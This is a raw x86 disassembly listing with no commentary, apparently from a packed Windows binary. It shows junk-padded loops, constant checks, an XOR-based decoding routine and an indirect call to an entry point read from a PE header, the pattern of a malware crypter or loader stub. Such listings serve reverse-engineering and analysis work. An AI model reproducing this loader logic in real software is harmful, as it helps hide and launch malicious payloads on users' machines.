  40d5ee:	test   al,0xe4
  40d5f0:	xchg   ebx,eax
  40d5f1:	xor    al,0x90
  40d5f3:	mov    al,0x45
  40d5f5:	shl    DWORD PTR ds:0xab3f5990,cl
  40d5fb:	test   al,0xe
  40d5fd:	in     al,0x93
  40d5ff:	sbb    al,0xc1
  40d601:	leave  
  40d602:	mov    eax,0x961fcd43
  40d607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d608:	mov    ds:0x7a8140fd,eax
  40d60d:	mov    ds:0x9456fd9,al
  40d612:	adc    ah,BYTE PTR [ecx-0x5fa02e78]
  40d618:	jnp    0x40d67d
  40d61a:	mov    eax,ds:0x9fc1e35
  40d61f:	ror    BYTE PTR ss:[ecx+0xaa2da4c],1
  40d626:	inc    edi
  40d627:	sbb    eax,0x8411a3dc
  40d62c:	push   edx
  40d62d:	enter  0x7c05,0xee
  40d631:	xchg   edx,eax
  40d632:	push   ecx
  40d633:	out    0x50,al
  40d635:	retf   
  40d636:	sub    eax,0x1bdbf733
  40d63b:	mov    dl,0x69
  40d63d:	out    0x15,al
  40d63f:	les    ebx,FWORD PTR [edi+0x11215015]
  40d645:	or     eax,0x6a2e2528
  40d64a:	push   eax
  40d64b:	push   ebx
  40d64c:	retf   
  40d64d:	inc    ebx
  40d64e:	mov    edi,0x540326bc
  40d653:	pop    ecx
  40d654:	aas    
  40d655:	scas   eax,DWORD PTR es:[edi]
  40d656:	jb     0x40d694
  40d658:	or     al,0x6a
  40d65a:	ins    BYTE PTR es:[edi],dx
  40d65b:	push   esi
  40d65c:	mov    cl,0x17
  40d65e:	inc    ecx
  40d660:	mov    al,ds:0x7fd34962
  40d665:	call   0x14d3ef24
  40d66a:	mov    eax,0xd8a1742
  40d66f:	sti    
  40d670:	dec    ebp
  40d671:	xchg   esi,eax
  40d672:	pop    es
  40d673:	jbe    0x40d689
  40d675:	cli    
  40d676:	int    0xd1
  40d678:	jecxz  0x40d60e
  40d67a:	add    DWORD PTR [ebx-0x5],esp
  40d67d:	push   eax
  40d67e:	ret    0x1246
  40d681:	push   ss
  40d682:	sbb    eax,0xcb47b9f2
  40d687:	or     ebx,edx
  40d689:	popf   
  40d68a:	mov    esi,esp
  40d68c:	jns    0x40d612
  40d68e:	out    dx,eax
  40d68f:	add    dl,ch
  40d691:	loop   0x40d6ef
  40d693:	das    
  40d694:	push   cs
  40d695:	xchg   edi,eax
  40d696:	pop    eax
  40d697:	cdq    
  40d698:	sub    eax,0xc3425a3e
  40d69d:	loope  0x40d6f3
  40d69f:	(bad)  
  40d6a0:	mov    ds:0xae4ca533,al
  40d6a5:	outs   dx,DWORD PTR ds:[esi]
  40d6a6:	jo     0x40d669
  40d6a8:	sti    
  40d6a9:	iret   
  40d6aa:	imul   esp,DWORD PTR ds:0xabe32ff0,0x7d
  40d6b1:	jge    0x40d697
  40d6b3:	mov    gs,WORD PTR [edx-0x3c]
  40d6b6:	mov    fs,WORD PTR [ecx]
  40d6b8:	mov    edi,0xceffa717
  40d6bd:	inc    eax
  40d6be:	or     al,0x9d
  40d6c0:	div    BYTE PTR [ecx+0xb]
  40d6c3:	mov    edx,DWORD PTR [edx]
  40d6c5:	popf   
  40d6c6:	inc    edx
  40d6c7:	fcmovu st,st(2)
  40d6c9:	stos   BYTE PTR es:[edi],al
  40d6ca:	fdiv   st(7),st
  40d6cc:	cmp    ecx,DWORD PTR [edx]
  40d6ce:	out    dx,al
  40d6cf:	pop    esp
  40d6d0:	sbb    al,0x67
  40d6d2:	jb     0x40d723
  40d6d4:	and    DWORD PTR [edx-0x7c39d3ff],0xffffffd7
  40d6db:	xor    DWORD PTR [edx+eax*4-0x4f81f791],eax
  40d6e2:	in     al,dx
  40d6e3:	stos   BYTE PTR es:[edi],al
  40d6e4:	ins    DWORD PTR es:[edi],dx
  40d6e5:	mov    ebp,0xeceafc22
  40d6ea:	cwde   
  40d6eb:	es push ebx
  40d6ed:	inc    ecx
  40d6ee:	fnstenv [ebx-0xb]
  40d6f1:	adc    ebx,edx
  40d6f3:	jnp    0x40d6b7
  40d6f5:	inc    esi
  40d6f6:	xchg   edi,eax
  40d6f7:	mov    dh,ah
  40d6f9:	lea    edi,[eax+0x3cf810c9]
  40d6ff:	loop   0x40d6e3
  40d701:	ja     0x40d6d3
  40d703:	rol    ecx,0xd8
  40d706:	dec    eax
  40d707:	xchg   BYTE PTR [edx+0x58],ah
  40d70a:	lock sub bl,BYTE PTR [ebx-0x7fc7d428]
  40d711:	mov    dh,0x38
  40d713:	and    BYTE PTR [edx],ah
  40d715:	cdq    
  40d716:	and    cl,BYTE PTR [ebx-0x5b]
  40d719:	sahf   
  40d71a:	pause  
  40d71c:	lds    esp,FWORD PTR [eax-0x7356766]
  40d722:	lock jmp 0x8a1c:0xc78514c7
  40d72a:	xchg   ebp,eax
  40d72b:	mov    eax,ds:0x948d4ab6
  40d730:	sar    dh,1
  40d732:	fcomp  QWORD PTR [eax-0xb]
  40d735:	popa   
  40d736:	aas    
  40d737:	mov    cl,0x4c
  40d739:	jg     0x40d769
  40d73b:	ret    0x5b0c
  40d73e:	jp     0x40d6dc
  40d740:	aaa    
  40d741:	inc    esi
  40d742:	stc    
  40d743:	nop
  40d744:	jle    0x40d736
  40d746:	lahf   
  40d747:	inc    ebx
  40d748:	sub    BYTE PTR [eax+0xfe444f8],al
  40d74e:	in     al,dx
  40d74f:	mov    ds:0x23a4a2fd,eax
  40d754:	lds    eax,FWORD PTR [edx]
  40d756:	lds    ecx,FWORD PTR [ebx+0x4b]
  40d759:	push   0x99412ff3
  40d75e:	fisttp QWORD PTR [edi+0x2030722c]
  40d764:	daa    
  40d765:	pop    edx
  40d766:	dec    esi
  40d767:	aam    0xb7
  40d769:	jg     0x40d70e
  40d76b:	dec    esp
  40d76c:	ss fs mov esi,0x9b896dbe
  40d773:	fsubp  st(2),st
  40d775:	xor    DWORD PTR [esi+0x12],ebp
  40d778:	lods   al,BYTE PTR ds:[esi]
  40d779:	mov    ecx,0x4de733b9
  40d77e:	call   0xb34978c8
  40d783:	jge    0x40d77d
  40d785:	inc    eax
  40d786:	xor    DWORD PTR [ebp+0xb],ebx
  40d789:	dec    ebx
  40d78a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d78b:	add    eax,0x93a9f9ad
  40d790:	push   esp
  40d791:	mov    esp,0x1b8b9aa8
  40d796:	mov    ecx,0x764df606
  40d79b:	rcr    BYTE PTR [edi],1
  40d79d:	das    
  40d79e:	and    cl,ch
  40d7a0:	cmc    
  40d7a1:	mov    fs:0xe9ac6179,eax
  40d7a7:	out    dx,eax
  40d7a8:	mov    BYTE PTR [ebx],bl
  40d7aa:	or     DWORD PTR [edx+0x10],ebx
  40d7ad:	sbb    edi,DWORD PTR [eax-0x3e]
  40d7b0:	mov    edi,0xe3beb7b3
  40d7b5:	dec    ebx
  40d7b6:	and    ecx,DWORD PTR [ecx+0x1a]
  40d7b9:	pop    ecx
  40d7ba:	addr16 nop
  40d7bc:	repz js 0x40d774
  40d7bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7c0:	push   ebp
  40d7c1:	fwait
  40d7c2:	enter  0xf481,0x6
  40d7c6:	mov    ah,0xe7
  40d7c8:	ds pop eax
  40d7ca:	cwde   
  40d7cb:	mov    edx,0xc0953921
  40d7d0:	mov    ebx,0x36e5fa7c
  40d7d5:	in     eax,dx
  40d7d6:	cmp    bh,BYTE PTR [edi-0x5e6febc5]
  40d7dc:	inc    esp
  40d7dd:	xor    edi,DWORD PTR [edx]
  40d7df:	mov    cl,BYTE PTR [eax+0x3ce4fe68]
  40d7e5:	fstp   DWORD PTR ss:[ebx-0x1f]
  40d7e9:	dec    eax
  40d7ea:	push   eax
  40d7eb:	pop    edi
  40d7ec:	ret    0x23ed
  40d7ef:	js     0x40d818
  40d7f1:	jno    0x40d855
  40d7f3:	pushf  
  40d7f4:	sahf   
  40d7f5:	call   0x4a37:0xa8cdf769
  40d7fc:	(bad)  [ebx+0x1f6d4ffe]
  40d802:	xchg   ebx,eax
  40d803:	js     0x40d809
  40d805:	fmul   QWORD PTR [ebx-0x79]
  40d808:	(bad)  
  40d809:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d80a:	aam    0xe8
  40d80c:	cli    
  40d80d:	fisub  WORD PTR [edx+0x3e135b7c]
  40d813:	jecxz  0x40d853
  40d815:	ss push edx
  40d817:	push   cs
  40d818:	or     al,al
  40d81a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d81b:	add    BYTE PTR [esi],al
  40d81d:	mov    eax,ds:0x1017fd97
  40d822:	or     eax,0x98df4d4b
  40d827:	and    al,0xc0
  40d829:	data16 jns 0x40d7d2
  40d82c:	or     eax,edi
  40d82e:	dec    ecx
  40d82f:	jecxz  0x40d7b6
  40d831:	xchg   esp,eax
  40d832:	jae    0x40d892
  40d834:	jns    0x40d80d
  40d836:	mov    WORD PTR [ebp+0x61],?
  40d839:	inc    edx
  40d83a:	fst    DWORD PTR ds:0x60d81cd6
  40d840:	lods   eax,DWORD PTR ds:[esi]
  40d841:	loopne 0x40d885
  40d843:	fsub   DWORD PTR [edi-0x14]
  40d846:	in     eax,dx
  40d847:	and    al,0xbe
  40d849:	push   0xffffffc5
  40d84b:	pop    edi
  40d84c:	retf   
  40d84d:	cwde   
  40d84e:	icebp  
  40d84f:	mov    edx,DWORD PTR [esi+0x7f]
  40d852:	stos   BYTE PTR es:[edi],al
  40d853:	and    al,0xc7
  40d855:	lods   eax,DWORD PTR ds:[esi]
  40d856:	dec    ebx
  40d857:	int    0x57
  40d859:	sahf   
  40d85a:	or     DWORD PTR [edi+0x5fca7ebf],ebx
  40d860:	dec    eax
  40d861:	sub    cl,ah
  40d863:	jecxz  0x40d831
  40d865:	mov    ebx,0xab059971
  40d86a:	repz jg 0x40d82d
  40d86d:	add    eax,0xd3de9bd1
  40d872:	add    edi,DWORD PTR [ebp-0x10]
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fce9,0x42e11c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fd76,0x42fcf1
  40d8af:	call   DWORD PTR ds:0x42e497
  40d8b5:	and    DWORD PTR ds:0x42fcfd,0x42fd82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e134,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e124,0x42fce9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e50f
  40d8ee:	sbb    DWORD PTR ds:0x42e6fb,0x42fd72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fcf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e457
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fd05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fd76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e124,0x42e6f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fd6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fced,0x42e118
  40d977:	call   DWORD PTR ds:0x42e49f
  40d97d:	mov    DWORD PTR ds:0x42e11c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e38f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fd01,0x42e134
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fced,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e2fb
  40d9be:	mov    DWORD PTR ds:0x42fd8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e118,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fcf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fcf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fcf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fcf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e18d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e54f
  40da20:	cmp    DWORD PTR ds:0x42fcf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fcf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fcf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fcf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e703,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e6f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fcd1,0x42e11c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fd05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fd05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fd05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e553
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fd05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fd05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e707,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e707,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e707,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e463
  40dae4:	cmp    DWORD PTR ds:0x42e707,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e707
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e707,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e707
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e707,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e6ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e6ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e6ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e557
  40db41:	cmp    DWORD PTR ds:0x42e6ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e6ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e6ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fd76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fd76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fd76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e55b
  40db97:	cmp    DWORD PTR ds:0x42fd76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fd76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fd76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e707,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e713,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fd7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fce5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fce5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fce5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fce5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fce5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e467
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e128,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fd01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fd09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e6f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e6f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e46b
  40dcaa:	cmp    DWORD PTR ds:0x42e6f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e6f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e6f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd82,0x42e12c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd82,0x42e124
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fcd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e118,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fd72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fd72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fd72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e46f
  40dd4f:	cmp    DWORD PTR ds:0x42fd72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fd72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fd72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fd0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e130,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fd09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd86,0x42fcfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e6f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e6ff,0x42fd8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e6eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fce5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fce5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fce5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fce5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fd09
  40de0d:	push   0x42e26d
  40de12:	call   DWORD PTR ds:0x42e473
  40de18:	cmp    DWORD PTR ds:0x42fce5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fd21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fcfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fcf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fcf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fcf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e55f
  40de65:	mov    edx,DWORD PTR ds:0x42fcf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fcf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
